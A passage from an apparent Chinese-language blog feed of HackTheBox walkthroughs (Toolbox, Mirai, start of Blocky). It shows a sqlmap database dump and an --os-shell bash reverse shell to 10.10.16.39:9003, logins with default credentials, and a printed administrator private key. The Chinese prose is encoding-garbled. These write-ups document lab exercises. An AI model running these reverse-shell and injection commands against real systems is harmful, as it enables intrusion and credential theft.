<span class="token operator">|</span> 4a100a85cb5ca3616dcf137918550815 <span class="token operator">|</span> admin    <span class="token operator">|</span>
+----------------------------------+----------+

<span class="token punctuation">[</span><span class="token number">23</span>:59:41<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> table <span class="token string">'public.users'</span> dumped to CSV <span class="token function">file</span> <span class="token string">'/home/kali/.local/share/sqlmap/output/admin.megalogistic.com/dump/public/users.csv'</span>
<span class="token punctuation">[</span><span class="token number">23</span>:59:41<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">23</span>:59:41 /2025-03-21/</code></pre>

<p>ä½¿ç”¨ â€“os-shell ç›´æ¥åå¼¹shell <code>bash -c &#39; bash -i &amp;&gt;/dev/tcp/10.10.16.39/9003 &lt;&amp;1&#39;</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ sqlmap <span class="token parameter variable">-r</span> megalogisic.txt  --force-ssl <span class="token parameter variable">--dbms</span> PostgreSQL --os-shell 
        ___
       __H__
 ___ ___<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.9</span>.2<span class="token comment">#stable&#125;</span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token string">']     | .'</span><span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span>
<span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span>"<span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>
      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:00:38 /2025-03-22/

[00:00:38] [INFO] parsing HTTP request from '</span>megalogisic.txt<span class="token string">'
&lt;...>
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
[00:01:47] [INFO] retrieved: '</span>postgres<span class="token string">'
command standard output: '</span>postgres<span class="token string">'
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] Y
[00:02:01] [INFO] retrieved: '</span>uid<span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span>,102<span class="token punctuation">(</span>ssl-<span class="token punctuation">..</span>.
<span class="token builtin class-name">command</span> standard output: <span class="token string">'uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)'</span>
os-shell<span class="token operator">></span> <span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">' bash -i &amp;>/dev/tcp/10.10.16.39/9003 &lt;&amp;1'</span>
<span class="token keyword">do</span> you want to retrieve the <span class="token builtin class-name">command</span> standard output? <span class="token punctuation">[</span>Y/n/a<span class="token punctuation">]</span> n
</code></pre>

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>æˆåŠŸæ¥æ”¶åˆ°shellï¼ŒæŸ¥çœ‹å†…æ ¸ä¿¡æ¯ï¼Œç³»ç»Ÿæ˜¯boot2docker</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">9003</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9003</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.10.236<span class="token punctuation">]</span> <span class="token number">49945</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">524</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span>,102<span class="token punctuation">(</span>ssl-cert<span class="token punctuation">)</span>
postgres@bc56e3cc55e9:/var/lib/postgresql$ <span class="token function">ifconfig</span> 
<span class="token function">ifconfig</span> 
eth0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu <span class="token number">1500</span>
        inet <span class="token number">172.17</span>.0.2  netmask <span class="token number">255.255</span>.0.0  broadcast <span class="token number">172.17</span>.255.255
        ether 02:42:ac:11:00:02  txqueuelen <span class="token number">0</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
        RX packets <span class="token number">3446</span>  bytes <span class="token number">686371</span> <span class="token punctuation">(</span><span class="token number">670.2</span> KiB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">3502</span>  bytes <span class="token number">1260682</span> <span class="token punctuation">(</span><span class="token number">1.2</span> MiB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ <span class="token function">uname</span> <span class="token parameter variable">-a</span>
<span class="token function">uname</span> <span class="token parameter variable">-a</span>
Linux bc56e3cc55e9 <span class="token number">4.14</span>.154-boot2docker <span class="token comment">#1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux</span>
</code></pre>

<p>é€šè¿‡Google  boot2docker æœ‰é»˜è®¤ç”¨æˆ·å’Œå¯†ç dockerï¼štcuserï¼Œä½¿ç”¨ssh åˆ‡æ¢ç”¨æˆ·</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">postgres@bc56e3cc55e9:/$ script /dev/null <span class="token parameter variable">-c</span> /bin/bash
script /dev/null <span class="token parameter variable">-c</span> /bin/bash
Script started, <span class="token function">file</span> is /dev/null
postgres@bc56e3cc55e9:/$ <span class="token function">ssh</span> docker@172.17.0.1
<span class="token function">ssh</span> docker@172.17.0.1
docker@172.17.0.1<span class="token string">'s password: tcuser

   ( '</span><span class="token operator">></span>'<span class="token punctuation">)</span>
  /<span class="token punctuation">)</span> TC <span class="token punctuation">(</span><span class="token punctuation">\</span>   Core is distributed with ABSOLUTELY NO WARRANTY.
 <span class="token punctuation">(</span>/-_--_-<span class="token punctuation">\</span><span class="token punctuation">)</span>           www.tinycorelinux.net

</code></pre>



<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>æŸ¥æ‰¾å¯ä»¥åˆ©ç”¨çš„ä¿¡æ¯ï¼Œå¯ä»¥åœ¨C:\Users\Administrator.ssh\ ä¸‹æ‰¾åˆ° id_rsa</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker@box:~$ <span class="token builtin class-name">cd</span> /c/Users                                                      
<span class="token builtin class-name">cd</span> /c/Users
docker@box:/c/Users$ <span class="token function">ls</span>                                                        
<span class="token function">ls</span>
Administrator  Default        Public         desktop.ini
All Users      Default User   Tony
docker@box:/c/Users$ <span class="token builtin class-name">cd</span> Administrator                                          
<span class="token builtin class-name">cd</span> Administrator
docker@box:/c/Users/Administrator$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>                                      
<span class="token function">ls</span> <span class="token parameter variable">-la</span>
total <span class="token number">1437</span>
drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff         <span class="token number">8192</span> Feb  <span class="token number">8</span>  <span class="token number">2021</span> <span class="token builtin class-name">.</span>
dr-xr-xr-x    <span class="token number">1</span> <span class="token function">docker</span>   staff         <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2020</span> <span class="token punctuation">..</span>
drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff         <span class="token number">4096</span> Mar <span class="token number">21</span> <span class="token number">15</span>:15 .VirtualBox
drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff            <span class="token number">0</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> .docker
drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff            <span class="token number">0</span> Feb <span class="token number">19</span>  <span class="token number">2020</span> .ssh
dr-xr-xr-x    <span class="token number">1</span> <span class="token function">docker</span>   staff            <span class="token number">0</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> 3D Objects
drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff            <span class="token number">0</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> AppData
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>

<p>å¤åˆ¶id_rsa åˆ°æœ¬åœ°ï¼Œèµ‹äºˆ600 æƒé™ï¼Œsshç™»å½•å¯è·å¾—ç®¡ç†å‘˜æƒé™</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker@box:/c/Users/Administrator/.ssh$ <span class="token function">cat</span> id_rsa                             
<span class="token function">cat</span> id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
-----END RSA PRIVATE KEY-----
</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa administrator@10.10.10.236  
The authenticity of <span class="token function">host</span> <span class="token string">'10.10.10.236 (10.10.10.236)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:KJAib23keV2B8xvFaxg7e79uztryW+LYX+Wb2qA9u4k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">10.10</span>.10.236' <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span> to the list of known hosts.

Microsoft Windows <span class="token punctuation">[</span>Version <span class="token number">10.0</span>.17763.1039<span class="token punctuation">]</span>
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2018</span> Microsoft Corporation. All rights reserved.

administrator@TOOLBOX C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">></span>
</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;var&#x2F;lib&#x2F;postgresql&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\flag.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Mirai</title>
    <url>/Hackthebox/htb/htb-mirai/</url>
    <content><![CDATA[<style>.buucfjrlfgaj{zoom:50%;}</style><img src="/Hackthebox/htb/htb-mirai/4ef1ea77e69185063d4200d7d0142baa.png" class="buucfjrlfgaj">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.48 <span class="token parameter variable">-sV</span>  <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-02 <span class="token number">11</span>:57 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.48
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65343</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>, <span class="token number">186</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE VERSION
<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">6</span>.7p1 Debian <span class="token number">5</span>+deb8u3 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">1024</span> aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">2048</span> e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain  dnsmasq <span class="token number">2.76</span>
<span class="token operator">|</span> dns-nsid: 
<span class="token operator">|</span>_  bind.version: dnsmasq-2.76
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http    lighttpd <span class="token number">1.4</span>.35
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: lighttpd/1.4.35
<span class="token number">1686</span>/tcp  <span class="token function">open</span>  upnp    Platinum UPnP <span class="token number">1.0</span>.5.13 <span class="token punctuation">(</span>UPnP/1.0 DLNADOC/1.50<span class="token punctuation">)</span>
<span class="token number">32400</span>/tcp <span class="token function">open</span>  http    Plex Media Server httpd
<span class="token operator">|</span>_http-title: Unauthorized
<span class="token operator">|</span>_http-cors: HEAD GET POST PUT DELETE OPTIONS
<span class="token operator">|</span> http-auth: 
<span class="token operator">|</span> HTTP/1.1 <span class="token number">401</span> Unauthorized<span class="token punctuation">\</span>x0D
<span class="token operator">|</span>_  Server returned status <span class="token number">401</span> but no WWW-Authenticate header.
<span class="token operator">|</span>_http-favicon: Plex
<span class="token number">32469</span>/tcp <span class="token function">open</span>  upnp    Platinum UPnP <span class="token number">1.0</span>.5.13 <span class="token punctuation">(</span>UPnP/1.0 DLNADOC/1.50<span class="token punctuation">)</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">122.17</span> seconds</code></pre>

<p>æ·»åŠ æœ¬åœ°åŸŸåè§£æåˆ°hosts</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.48 mirai.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<p>è®¿é—®ç›®æ ‡ <a href="http://mirai.htb/">http://mirai.htb</a> ,å³é”®æŸ¥çœ‹æºç ï¼Œæ‰¾åˆ°ä¸€ä¸ªè·¯å¾„</p>
<img src="/Hackthebox/htb/htb-mirai/image-20250302122107403.png" class="" title="æºç ">è®¿é—®/admin å¯ä»¥çœ‹åˆ°æ˜¯æ ‘è‹ºæ´¾

<img src="/Hackthebox/htb/htb-mirai/image-20250302122612935.png" class="" title="é¢æ¿">

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ä½¿ç”¨æ ‘è‹ºæ´¾é»˜è®¤å‡­è¯ pi:raspberry ç™»å½•SSH</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> pi@mirai.htb              
The authenticity of <span class="token function">host</span> <span class="token string">'mirai.htb (10.10.10.48)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>mirai.htb<span class="token string">' (ED25519) to the list of known hosts.
pi@mirai.htb'</span>s password: 

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug <span class="token number">27</span> <span class="token number">14</span>:47:50 <span class="token number">2017</span> from localhost

SSH is enabled and the default password <span class="token keyword">for</span> the <span class="token string">'pi'</span> user has not been changed.
This is a security risk - please login as the <span class="token string">'pi'</span> user and <span class="token builtin class-name">type</span> <span class="token string">'passwd'</span> to <span class="token builtin class-name">set</span> a new password.


SSH is enabled and the default password <span class="token keyword">for</span> the <span class="token string">'pi'</span> user has not been changed.
This is a security risk - please login as the <span class="token string">'pi'</span> user and <span class="token builtin class-name">type</span> <span class="token string">'passwd'</span> to <span class="token builtin class-name">set</span> a new password.

pi@raspberrypi:~ $ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,20<span class="token punctuation">(</span>dialout<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,60<span class="token punctuation">(</span>games<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span>,101<span class="token punctuation">(</span>input<span class="token punctuation">)</span>,108<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,117<span class="token punctuation">(</span>i2c<span class="token punctuation">)</span>,998<span class="token punctuation">(</span>gpio<span class="token punctuation">)</span>,999<span class="token punctuation">(</span>spi<span class="token punctuation">)</span>
</code></pre>

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>è¿è¡Œsudo -l å¯ä»¥çœ‹åˆ°èƒ½ç›´æ¥åˆ‡æ¢rootç”¨æˆ·ï¼ŒæŸ¥çœ‹root.txt æç¤ºå¤‡ä»½åœ¨USB stick</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pi@raspberrypi:~ $ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> pi on localhost:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User pi may run the following commands on localhost:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: ALL
pi@raspberrypi:~ $ <span class="token function">sudo</span> <span class="token parameter variable">-i</span>

SSH is enabled and the default password <span class="token keyword">for</span> the <span class="token string">'pi'</span> user has not been changed.
This is a security risk - please login as the <span class="token string">'pi'</span> user and <span class="token builtin class-name">type</span> <span class="token string">'passwd'</span> to <span class="token builtin class-name">set</span> a new password.


SSH is enabled and the default password <span class="token keyword">for</span> the <span class="token string">'pi'</span> user has not been changed.
This is a security risk - please login as the <span class="token string">'pi'</span> user and <span class="token builtin class-name">type</span> <span class="token string">'passwd'</span> to <span class="token builtin class-name">set</span> a new password.

root@raspberrypi:~<span class="token comment"># ls</span>
root.txt
root@raspberrypi:~<span class="token comment"># cat root.txt </span>
I lost my original root.txt<span class="token operator">!</span> I think I may have a backup on my USB stick<span class="token punctuation">..</span>.
root@raspberrypi:~<span class="token comment"># </span></code></pre>

<p>æŸ¥çœ‹é©±åŠ¨æ¸…å•ï¼Œè¿›å…¥&#x2F;media&#x2F;usbstickï¼ŒæŸ¥çœ‹ damnit.txt </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@raspberrypi:/<span class="token comment"># df -hl</span>
Filesystem      Size  Used Avail Use% Mounted on
aufs            <span class="token number">8</span>.5G  <span class="token number">2</span>.8G  <span class="token number">5</span>.3G  <span class="token number">34</span>% /
tmpfs           100M  <span class="token number">4</span>.8M   96M   <span class="token number">5</span>% /run
/dev/sda1       <span class="token number">1</span>.3G  <span class="token number">1</span>.3G     <span class="token number">0</span> <span class="token number">100</span>% /lib/live/mount/persistence/sda1
/dev/loop0      <span class="token number">1</span>.3G  <span class="token number">1</span>.3G     <span class="token number">0</span> <span class="token number">100</span>% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs           250M     <span class="token number">0</span>  250M   <span class="token number">0</span>% /lib/live/mount/overlay
/dev/sda2       <span class="token number">8</span>.5G  <span class="token number">2</span>.8G  <span class="token number">5</span>.3G  <span class="token number">34</span>% /lib/live/mount/persistence/sda2
devtmpfs         10M     <span class="token number">0</span>   10M   <span class="token number">0</span>% /dev
tmpfs           250M  <span class="token number">8</span>.0K  250M   <span class="token number">1</span>% /dev/shm
tmpfs           <span class="token number">5</span>.0M  <span class="token number">4</span>.0K  <span class="token number">5</span>.0M   <span class="token number">1</span>% /run/lock
tmpfs           250M     <span class="token number">0</span>  250M   <span class="token number">0</span>% /sys/fs/cgroup
tmpfs           250M  <span class="token number">8</span>.0K  250M   <span class="token number">1</span>% /tmp
/dev/sdb        <span class="token number">8</span>.7M   93K  <span class="token number">7</span>.9M   <span class="token number">2</span>% /media/usbstick
tmpfs            50M     <span class="token number">0</span>   50M   <span class="token number">0</span>% /run/user/999
tmpfs            50M     <span class="token number">0</span>   50M   <span class="token number">0</span>% /run/user/1000
root@raspberrypi:/<span class="token comment"># cd /media/usbstick</span>
root@raspberrypi:/media/usbstick<span class="token comment"># ls</span>
damnit.txt  lost+found

root@raspberrypi:/media/usbstick<span class="token comment"># cat damnit.txt </span>
Damnit<span class="token operator">!</span> Sorry <span class="token function">man</span> I accidentally deleted your files off the USB stick.
Do you know <span class="token keyword">if</span> there is any way to get them back?

<span class="token parameter variable">-James</span></code></pre>

<p>ä½¿ç”¨strings æŸ¥çœ‹å­—ç¬¦ä¸²</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@raspberrypi:/media/usbstick<span class="token comment"># strings /dev/sdb </span>
<span class="token operator">></span>r <span class="token operator">&amp;</span>
/media/usbstick
lost+found
root.txt
damnit.txt
<span class="token operator">></span>r <span class="token operator">&amp;</span>
<span class="token operator">></span>r <span class="token operator">&amp;</span>
/media/usbstick
lost+found
root.txt
damnit.txt
<span class="token operator">></span>r <span class="token operator">&amp;</span>
/media/usbstick
<span class="token number">2</span><span class="token punctuation">]</span><span class="token number">8</span>^
lost+found
root.txt
damnit.txt
<span class="token operator">></span>r <span class="token operator">&amp;</span>
3d3e483143ff12ec505d026fa13e020b
Damnit<span class="token operator">!</span> Sorry <span class="token function">man</span> I accidentally deleted your files off the USB stick.
Do you know <span class="token keyword">if</span> there is any way to get them back?
<span class="token parameter variable">-James</span></code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;pi&#x2F;Desktop&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">strings &#x2F;dev&#x2F;sdb</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>é»˜è®¤å¯†ç </tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Blocky</title>
    <url>/Hackthebox/htb/htb-blocky/</url>
    <content><![CDATA[<style>.xxvghfarkrcm{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blocky/f412784c311bdf52c3655381d2c9cd21.png" class="xxvghfarkrcm">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.37 <span class="token parameter variable">-sV</span>  <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span>  <span class="token parameter variable">-e</span> tun0  
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-02 <span class="token number">10</span>:43 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.37
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65530</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE  SERVICE   VERSION
<span class="token number">21</span>/tcp    <span class="token function">open</span>   <span class="token function">ftp</span>       ProFTPD <span class="token number">1.3</span>.5a
<span class="token number">22</span>/tcp    <span class="token function">open</span>   <span class="token function">ssh</span>       OpenSSH <span class="token number">7</span>.2p2 Ubuntu 4ubuntu2.2 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
